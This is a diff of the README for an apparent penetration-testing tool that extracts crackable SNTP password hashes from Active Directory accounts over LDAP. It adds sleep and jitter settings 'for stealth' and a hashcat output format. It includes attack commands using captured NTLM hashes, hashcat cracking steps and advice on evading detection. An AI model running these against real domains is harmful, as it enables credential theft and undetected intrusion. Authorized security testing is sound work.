@@ -18,7 +18,7 @@
 🔓 **No Domain Join Required** - Execute attacks from any network position with LDAP connectivity
 🔑 **NTLM Hash Authentication** - Authenticate using captured NTLM hashes instead of cleartext passwords
 🛡️ **Enhanced Safety Features** - Comprehensive attribute restoration verification with interactive prompts
-⚡ **Rate Limiting** - Configurable request rates to avoid detection and dropped packets
+⚡ **Sleep & Jitter Control** - Configurable sleep timing with randomization for stealth operations
 📊 **Verbose Logging** - Detailed operation tracking and status reporting
 
 ## Features
@@ -42,8 +42,10 @@
 - **Error Handling**: Comprehensive exception handling with detailed error messages
 
 ### Output & Reporting
-- **Console Output**: Real-time status updates and hash display
-- **File Output**: Save extracted hashes to specified output files
+- **Console Output**: Real-time status updates and hash display (username format)
+- **Dual File Output**: Save hashes in both username and pure hashcat formats simultaneously
+- **Username Format**: Saves as `username:$sntp-ms$hash$salt` for identification purposes
+- **Hashcat Format**: Saves as `$sntp-ms$hash$salt` for direct hashcat input
 - **Verbose Mode**: Detailed operational logging for troubleshooting
 - **Quiet Mode**: Minimal output for stealth operations
 
@@ -104,9 +106,14 @@ admin.user
 
 ### Advanced Options
 
-**Custom Rate Limiting:**
+**Custom Sleep Timing:**
 ```bash
-python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --rate 100
+python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --sleep 1.5
+```
+
+**Sleep with Jitter (Stealth Mode):**
+```bash
+python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --sleep 2.0 --jitter 30
 ```
 
 **SSL Connection:**
@@ -119,9 +126,19 @@ python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim
 python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser -v
 ```
 
-**Output to File:**
+**Save Username Format to File:**
 ```bash
-python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --file targets.txt -o extracted_hashes.txt
+python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --file targets.txt -o usernames.txt
+```
+
+**Save Pure Hashcat Format to File:**
+```bash
+python moneyshot.py dc01.example.com -d example.com -u admin -H hash --victim testuser --hashcat hashes.txt
+```
+
+**Save Both Formats Simultaneously:**
+```bash
+python moneyshot.py dc01.example.com -d example.com -u admin -H hash --file targets.txt -o usernames.txt --hashcat hashes.txt
 ```
 
 ## Command Line Options
@@ -135,8 +152,10 @@ python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --file t
 | `-H, --hash` | NTLM hash (LM:NT or NT only) | - |
 | `--victim` | Single target username | - |
 | `--file` | File with target usernames (one per line) | - |
-| `-o, --output` | Output file for extracted hashes | stdout |
-| `--rate` | Requests per second | 180 |
+| `-o, --output` | Output file for hashes in username:hash format | stdout |
+| `--hashcat` | Output file for pure hashcat format (removes username prefix) | - |
+| `--sleep` | Seconds to sleep between requests (supports decimals) | 0.006 |
+| `--jitter` | Jitter percentage for sleep timing (0-100) | 0 |
 | `--timeout` | NTP timeout in seconds | 24 |
 | `--source-port` | Custom source port for NTP | Random |
 | `--ssl` | Use SSL for LDAP connection | False |
@@ -156,22 +175,41 @@ python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --file t
 4. **Hash Extraction**: Processes 68-byte NTP responses to extract MD5 hash and salt
 5. **Attribute Restoration**: Restores original attribute values and verifies successful restoration
 
-### Output Format
+### Output Formats
 
-Extracted hashes are formatted for hashcat mode 31300:
+**Default Output (Username Format)**:
 ```
-<RID>:$sntp-ms$<hash>$<salt>
+<username>:$sntp-ms$<hash>$<salt>
 ```
 
 Example:
 ```
-1001:$sntp-ms$a1b2c3d4e5f6789012345678901234567$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+testuser:$sntp-ms$a1b2c3d4e5f6789012345678901234567$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+```
+
+**Hashcat Format** (using `--hashcat` option):
+```
+$sntp-ms$<hash>$<salt>
+```
+
+Example:
+```
+$sntp-ms$a1b2c3d4e5f6789012345678901234567$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
 ```
 
 ### Cracking with Hashcat
 
+**Using Username Format File:**
 ```bash
-hashcat -m 31300 extracted_hashes.txt wordlist.txt
+# Remove usernames first, then crack
+cut -d: -f2- usernames.txt > hashes_only.txt
+hashcat -m 31300 hashes_only.txt wordlist.txt
+```
+
+**Using Pure Hashcat Format File:**
+```bash
+# Direct input to hashcat
+hashcat -m 31300 hashes.txt wordlist.txt
 ```
 
 ## Safety Considerations
@@ -183,10 +221,11 @@ hashcat -m 31300 extracted_hashes.txt wordlist.txt
 - Manual intervention required for failed restorations to prevent account compromise
 
 ### Operational Security
-- Use appropriate rate limiting to avoid detection
+- Use appropriate sleep timing and jitter to avoid detection patterns
 - Monitor domain controller logs for suspicious activity
 - Test in isolated environments before production use
 - Ensure proper authorization before conducting assessments
+- Consider using `--sleep 2.0 --jitter 50` for stealth operations
 
 ### Error Handling
 - Comprehensive exception handling prevents script crashes
